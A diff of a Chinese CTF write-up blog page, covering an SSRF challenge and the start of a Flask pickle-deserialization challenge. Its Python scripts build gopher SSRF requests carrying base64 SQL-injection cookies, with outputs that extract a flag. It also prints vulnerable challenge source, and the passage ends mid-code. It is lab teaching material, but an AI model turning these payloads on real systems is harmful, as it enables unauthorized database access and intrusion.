class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;</span></span><br><span class="line"><span class="string">Origin: http://61.147.171.105:61245</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Referer: http://61.147.171.105:61245/</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(content_length,content)</span><br><span class="line"></span><br><span class="line">temp = urllib.parse.quote(payload)   <span class="comment"># 对特殊字符进行编码</span></span><br><span class="line">new = temp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new   <span class="comment"># gopher会将第一个字符吞噬，所以加个下划线</span></span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></div>
 
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A//127.0.0.1%3A80/_POST%2520/%2520HTTP/1.1%250D%250AHost%253A%252061.147.171.105%253A61245%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%253B%2520rv%253A109.0%2529%2520Gecko/20100101%2520Firefox/119.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252C%252A/%252A%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Czh-TW%253Bq%253D0.7%252Czh-HK%253Bq%253D0.5%252Cen-US%253Bq%253D0.3%252Cen%253Bq%253D0.2%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252024%250D%250AOrigin%253A%2520http%253A//61.147.171.105%253A61245%250D%250AConnection%253A%2520close%250D%250AReferer%253A%2520http%253A//61.147.171.105%253A61245/%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250A%250D%250Auname%253Dadmin%2526passwd%253Dadmin%250D%250A</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A//127.0.0.1%3A80/_POST%2520/%2520HTTP/1.1%250D%250AHost%253A%252061.147.171.105%253A61245%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%253B%2520rv%253A109.0%2529%2520Gecko/20100101%2520Firefox/119.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252C%252A/%252A%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Czh-TW%253Bq%253D0.7%252Czh-HK%253Bq%253D0.5%252Cen-US%253Bq%253D0.3%252Cen%253Bq%253D0.2%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252024%250D%250AOrigin%253A%2520http%253A//61.147.171.105%253A61245%250D%250AConnection%253A%2520close%250D%250AReferer%253A%2520http%253A//61.147.171.105%253A61245/%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250A%250D%250Auname%253Dadmin%2526passwd%253Dadmin%250D%250A</span><br></pre></td></tr></table></figure></div>
 
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 请求内容可以简单些，上面是直接复制的（注意删掉cookie）</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /index.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:80</span></span><br><span class="line"><span class="string">User-Agent: curl/7.43.0</span></span><br><span class="line"><span class="string">Accept: */*</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(content_length,content)</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 请求内容可以简单些，上面是直接复制的（注意删掉cookie）</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /index.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:80</span></span><br><span class="line"><span class="string">User-Agent: curl/7.43.0</span></span><br><span class="line"><span class="string">Accept: */*</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(content_length,content)</span><br></pre></td></tr></table></figure></div>
 
 <p>抓包</p>
 <p><img  
@@ -688,7 +595,7 @@
                       alt="image-20240125123556748"
                 ></p>
 <p>获得响应数据，其中</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: this_is_your_cookie=YWRtaW4%3D; expires=Thu, 25-Jan-2024 05:08:13 GMT; Max-Age=3600</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: this_is_your_cookie=YWRtaW4%3D; expires=Thu, 25-Jan-2024 05:08:13 GMT; Max-Age=3600</span><br></pre></td></tr></table></figure></div>
 
 <p><img  
                      lazyload
@@ -698,7 +605,7 @@
                 ></p>
 <p>cookie值是admin7，猜测注入点在这个cookie上（前提是以本地身份访问，所以不能直接抓包改cookie）</p>
 <p>脚本就在之前的基础上加上<code>cookie: this_is_your_cookie=MScgIw==	// 1&#39; #</code></p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A//127.0.0.1%3A80/_POST%2520/%2520HTTP/1.1%250D%250AHost%253A%252061.147.171.105%253A61245%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%253B%2520rv%253A109.0%2529%2520Gecko/20100101%2520Firefox/119.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252C%252A/%252A%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Czh-TW%253Bq%253D0.7%252Czh-HK%253Bq%253D0.5%252Cen-US%253Bq%253D0.3%252Cen%253Bq%253D0.2%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252024%250D%250AOrigin%253A%2520http%253A//61.147.171.105%253A61245%250D%250AConnection%253A%2520close%250D%250AReferer%253A%2520http%253A//61.147.171.105%253A61245/%250D%250ACookie%253A%2520this_is_your_cookie%253DMScgIw%253D%253D%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250A%250D%250Auname%253Dadmin%2526passwd%253Dadmin%250D%250A</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A//127.0.0.1%3A80/_POST%2520/%2520HTTP/1.1%250D%250AHost%253A%252061.147.171.105%253A61245%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%253B%2520rv%253A109.0%2529%2520Gecko/20100101%2520Firefox/119.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252C%252A/%252A%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Czh-TW%253Bq%253D0.7%252Czh-HK%253Bq%253D0.5%252Cen-US%253Bq%253D0.3%252Cen%253Bq%253D0.2%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252024%250D%250AOrigin%253A%2520http%253A//61.147.171.105%253A61245%250D%250AConnection%253A%2520close%250D%250AReferer%253A%2520http%253A//61.147.171.105%253A61245/%250D%250ACookie%253A%2520this_is_your_cookie%253DMScgIw%253D%253D%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250A%250D%250Auname%253Dadmin%2526passwd%253Dadmin%250D%250A</span><br></pre></td></tr></table></figure></div>
 
 <p><img  
                      lazyload
@@ -706,7 +613,7 @@
                      data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202401251548067.png"
                       alt="image-20240125154811884"
                 ></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">content=<span class="string">&quot;uname=admin&amp;passwd=admin&quot;</span></span><br><span class="line">content_length=<span class="built_in">len</span>(content)</span><br><span class="line">sql = <span class="string">&quot;1&#x27;) and extractvalue(1,concat(0x7e,0x7e)) #&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)	<span class="comment"># 注意闭合方式</span></span><br><span class="line">base64_sql = <span class="built_in">str</span>(base64.b64encode(sql),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">cookie = <span class="string">&quot;this_is_your_cookie=&quot;</span>+base64_sql</span><br><span class="line"><span class="built_in">print</span>(cookie)</span><br><span class="line">payload=\</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 61.147.171.105:61245</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;</span></span><br><span class="line"><span class="string">Origin: http://61.147.171.105:61245</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Referer: http://61.147.171.105:61245/</span></span><br><span class="line"><span class="string">Cookie: &#123;&#125;</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(content_length,cookie,content)</span><br><span class="line"></span><br><span class="line">temp = urllib.parse.quote(payload)   <span class="comment"># 对特殊字符进行编码</span></span><br><span class="line">new = temp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new   <span class="comment"># gopher会将第一个字符吞噬，所以加个下划线</span></span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">content=<span class="string">&quot;uname=admin&amp;passwd=admin&quot;</span></span><br><span class="line">content_length=<span class="built_in">len</span>(content)</span><br><span class="line">sql = <span class="string">&quot;1&#x27;) and extractvalue(1,concat(0x7e,0x7e)) #&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)	<span class="comment"># 注意闭合方式</span></span><br><span class="line">base64_sql = <span class="built_in">str</span>(base64.b64encode(sql),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">cookie = <span class="string">&quot;this_is_your_cookie=&quot;</span>+base64_sql</span><br><span class="line"><span class="built_in">print</span>(cookie)</span><br><span class="line">payload=\</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 61.147.171.105:61245</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;</span></span><br><span class="line"><span class="string">Origin: http://61.147.171.105:61245</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Referer: http://61.147.171.105:61245/</span></span><br><span class="line"><span class="string">Cookie: &#123;&#125;</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(content_length,cookie,content)</span><br><span class="line"></span><br><span class="line">temp = urllib.parse.quote(payload)   <span class="comment"># 对特殊字符进行编码</span></span><br><span class="line">new = temp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new   <span class="comment"># gopher会将第一个字符吞噬，所以加个下划线</span></span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></div>
 
 <p><img  
                      lazyload
@@ -715,9 +622,9 @@
                       alt="image-20240125163221145"
                 ></p>
 <p>可以进行报错注入（至于它的闭合，’ 返回语法错误，” 不报错，说明它的闭合是 单引号+括号<code>&#39;(</code>）</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sql = <span class="string">&quot;1&#x27;) and extractvalue(1,concat(0x7e,(select database()),0x7e)) #&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># Issue with your mysql: XPATH syntax error: &#x27;~security~&#x27;</span></span><br><span class="line"></span><br><span class="line">sql = <span class="string">&quot;1&#x27;) and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) #&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># Issue with your mysql: XPATH syntax error: &#x27;~emails,flag,referers,uagents,us&#x27;</span></span><br><span class="line"></span><br><span class="line">sql = <span class="string">&quot;1&#x27;) and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),0x7e)) #&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># Issue with your mysql: XPATH syntax error: &#x27;~flag~&#x27;</span></span><br><span class="line"></span><br><span class="line">sql = <span class="string">&quot;1&#x27;) and extractvalue(1,concat(0x7e,(select flag from flag),0x7e)) #&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># Issue with your mysql: XPATH syntax error: &#x27;~cyberpeace&#123;1afdd142da69ce377b1f&#x27;</span></span><br><span class="line"></span><br><span class="line">sql = <span class="string">&quot;1&#x27;) and extractvalue(1,concat(0x7e,substr((select flag from flag),30,30),0x7e)) #&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment">#Issue with your mysql: XPATH syntax error: &#x27;~1fb3505dfe4568&#125;~&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cyberpeace&#123;1afdd142da69ce377b1fb3505dfe4568&#125;</span></span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sql = <span class="string">&quot;1&#x27;) and extractvalue(1,concat(0x7e,(select database()),0x7e)) #&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># Issue with your mysql: XPATH syntax error: &#x27;~security~&#x27;</span></span><br><span class="line"></span><br><span class="line">sql = <span class="string">&quot;1&#x27;) and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) #&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># Issue with your mysql: XPATH syntax error: &#x27;~emails,flag,referers,uagents,us&#x27;</span></span><br><span class="line"></span><br><span class="line">sql = <span class="string">&quot;1&#x27;) and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),0x7e)) #&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># Issue with your mysql: XPATH syntax error: &#x27;~flag~&#x27;</span></span><br><span class="line"></span><br><span class="line">sql = <span class="string">&quot;1&#x27;) and extractvalue(1,concat(0x7e,(select flag from flag),0x7e)) #&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># Issue with your mysql: XPATH syntax error: &#x27;~cyberpeace&#123;1afdd142da69ce377b1f&#x27;</span></span><br><span class="line"></span><br><span class="line">sql = <span class="string">&quot;1&#x27;) and extractvalue(1,concat(0x7e,substr((select flag from flag),30,30),0x7e)) #&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment">#Issue with your mysql: XPATH syntax error: &#x27;~1fb3505dfe4568&#125;~&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cyberpeace&#123;1afdd142da69ce377b1fb3505dfe4568&#125;</span></span><br></pre></td></tr></table></figure></div>
 
-<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/0kai0/p/17018175.html" >参考 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/0kai0/p/17018175.html" >参考<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 <h2 id="HFCTF-2021-Final-easyflask"><a href="#HFCTF-2021-Final-easyflask" class="headerlink" title="[HFCTF 2021 Final]easyflask"></a>[HFCTF 2021 Final]easyflask</h2><h5 id="pickle–Python序列化"><a href="#pickle–Python序列化" class="headerlink" title="pickle–Python序列化"></a>pickle–Python序列化</h5><ul>
 <li><p>模块 pickle 实现了对一个 Python 对象结构的二进制序列化和反序列化</p>
 </li>
@@ -728,7 +635,7 @@
 </li>
 </ul>
 <p>首先</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ade21a03-924c-4236-9788-4198aa99bc39.node5.buuoj.cn:81/file?file=index.js</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ade21a03-924c-4236-9788-4198aa99bc39.node5.buuoj.cn:81/file?file=index.js</span><br></pre></td></tr></table></figure></div>
 
 <p>尝试模板注入无果</p>
 <p><img  
@@ -738,7 +645,7 @@
                       alt="image-20240125172154087"
                 ></p>
 <p>输入路径，得到源码</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;*******&quot;</span></span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_handler</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;u&#x27;</span>):</span><br><span class="line">        u = pickle.dumps(User())</span><br><span class="line">        session[<span class="string">&#x27;u&#x27;</span>] = u</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/file?file=index.js&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_handler</span>():</span><br><span class="line">    path = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    path = os.path.join(<span class="string">&#x27;static&#x27;</span>, path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path) <span class="keyword">or</span> os.path.isdir(path) \</span><br><span class="line">            <span class="keyword">or</span> <span class="string">&#x27;.py&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;.sh&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;disallowed&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        content = fp.read()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_handler</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        u = session.get(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(u, <span class="built_in">dict</span>):</span><br><span class="line">            u = b64decode(u.get(<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line">        u = pickle.loads(u)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;uhh?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> u.is_admin == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome, 